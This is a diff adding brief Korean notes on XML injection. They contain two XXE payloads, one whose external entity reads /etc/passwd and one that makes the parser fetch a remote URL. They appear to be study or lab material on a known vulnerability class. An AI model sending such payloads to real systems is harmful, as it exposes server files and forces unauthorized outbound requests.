@@ -1,0 +1,22 @@
+ 3) XML 인젝션
+
+ ① 
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [<!ENTITY XXE SYSTEM "file:///etc/passwd">
+]>
+<reset>
+	<login>&XXE;</login>
+	<secret>test</secret>
+</reset>
+
+
+ ② 
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [<!ENTITY XXE SYSTEM "http://net123.tistory.com/robots.txt">
+]>
+<reset>
+	<login>&XXE;</login>
+	<secret>test</secret>
+</reset>
